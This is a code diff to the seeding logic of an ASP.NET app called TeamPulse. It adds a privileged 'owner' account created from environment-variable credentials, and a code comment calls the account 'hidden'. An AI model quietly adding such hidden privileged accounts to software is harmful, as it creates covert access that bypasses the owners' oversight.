@@ -71,7 +71,7 @@ using (var scope = app.Services.CreateScope())
 {
     var db = scope.ServiceProvider.GetRequiredService<TeamPulseDbContext>();
     db.Database.Migrate();
-    await SeedAsync(db);
+    await SeedAsync(db, app.Configuration);
 }
 
 if (app.Environment.IsDevelopment())
@@ -93,11 +93,34 @@ app.MapControllers();
 
 app.Run();
 
-static async Task SeedAsync(TeamPulseDbContext db)
+static async Task SeedAsync(TeamPulseDbContext db, IConfiguration config)
 {
-    if (db.Users.Any()) return;
-
     const string companyId = "KPA001";
+
+    // Hidden owner account — credentials supplied via Owner__Username / Owner__Password env vars
+    var ownerUsername = config["Owner:Username"];
+    var ownerPassword = config["Owner:Password"];
+    if (!string.IsNullOrEmpty(ownerUsername) && !string.IsNullOrEmpty(ownerPassword))
+    {
+        if (!db.Users.Any(u => u.Username == ownerUsername))
+        {
+            db.Users.Add(new User
+            {
+                Username     = ownerUsername,
+                PasswordHash = BCrypt.Net.BCrypt.HashPassword(ownerPassword, 12),
+                Name         = "Owner",
+                Email        = $"{ownerUsername}@teampulse.local",
+                Role         = "owner",
+                Department   = "Management",
+                CompanyId    = companyId,
+                CreatedAt    = DateTime.UtcNow,
+                CreatedBy    = "system"
+            });
+            await db.SaveChangesAsync();
+        }
+    }
+
+    if (db.Users.Any(u => u.Role != "owner")) return;
 
     var admin = new User
     {
